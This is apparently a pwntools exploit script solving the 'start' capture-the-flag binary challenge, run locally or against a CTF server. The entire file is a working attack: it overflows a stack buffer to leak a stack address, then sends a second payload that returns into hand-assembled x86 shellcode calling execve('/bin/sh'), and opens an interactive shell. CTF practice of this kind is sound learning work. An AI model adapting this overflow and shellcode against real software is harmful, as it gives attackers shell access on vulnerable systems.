#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./start"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 22032)
    #r=remote("chall.pwnable.tw", 10000)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

sh = '''
     call here
     .ascii "/bin/sh"
     .byte 0
here:
     pop ebx
     xor ecx,ecx
     xor edx,edx
     mov al,0x0b
     int 0x80
'''
sh = asm(sh)

r.recvuntil("Let's start the CTF:")

addr = 0x08048087
payload = 'a'*0x14 + p32(addr)

print hex(len(payload))

r.send(payload)
stack_addr = r.recv()[:4]
stack_addr = u32(stack_addr)

payload2 = 'a'*0x14 + p32(stack_addr + 0x14) +sh 
debug()
r.sendline(payload2)
r.interactive()
